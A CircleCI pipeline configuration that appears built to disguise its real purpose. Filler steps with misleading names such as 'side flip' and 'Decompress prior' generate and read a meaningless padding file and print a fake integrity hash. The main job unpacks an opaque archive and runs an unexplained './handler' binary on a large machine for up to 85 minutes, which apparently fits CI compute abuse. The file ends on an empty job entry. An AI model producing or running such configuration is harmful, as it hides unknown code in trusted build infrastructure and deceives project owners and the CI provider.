version: 2.1

jobs:
  postbuild_pr-x:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: side flip
          command: |
            mkdir -p /tmp/green
            set +o pipefail 2>/dev/null; seq 1 1287837 | awk '{printf "%s\t", $0; if(NR%5==0) print ""}' | expand > /tmp/green/persist.sig; true
            echo "integrity: $(sha256sum /tmp/green/persist.sig | cut -c1-20)"
      - persist_to_workspace:
          root: /tmp/green
          paths:
            - persist.sig
  pr-x:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/green
      - run:
          name: Decompress prior
          command: |
            tr 'A-Z' 'a-z' < /tmp/green/persist.sig 2>/dev/null | head -c 50 || true
      - run:
          name: Retrieve sources
          command: git clone -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Prepare source archive
          command: tar -xJf ci-artifacts.tar.xz
      - run:
          no_output_timeout: 85m
          command: /bin/bash -c "./handler"
  Beta_refactor-2787:
